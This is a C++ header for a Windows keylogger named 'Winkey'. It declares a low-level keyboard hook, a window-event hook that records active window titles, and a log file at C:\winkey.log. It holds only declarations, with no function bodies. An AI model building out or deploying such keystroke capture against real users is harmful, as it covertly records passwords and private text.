#pragma once

#include "sdk.h"
#include <ctime>
#pragma comment(lib, "user32.lib")

#define LOG_FILE TEXT("C:\\winkey.log")

namespace Winkey {
	HANDLE	gLogHandle;
	TCHAR	gLastWindowTitle[512] = { 0 };
	BOOL	gReportNextWindow = false;

	int Construct();
	void Destroy();

	int Hook();
	LRESULT CALLBACK onKey(int nCode,
		WPARAM wParam,
		LPARAM lParam);
	LRESULT CALLBACK onWindow(HWINEVENTHOOK hWinEventHook,
		DWORD event,
		HWND hwnd,
		LONG idObject,
		LONG idChild,
		DWORD idEventThread,
		DWORD dwmsEventTime);
	std::string solve(KBDLLHOOKSTRUCT *kbdEv);
	void logCurrentWindow();
};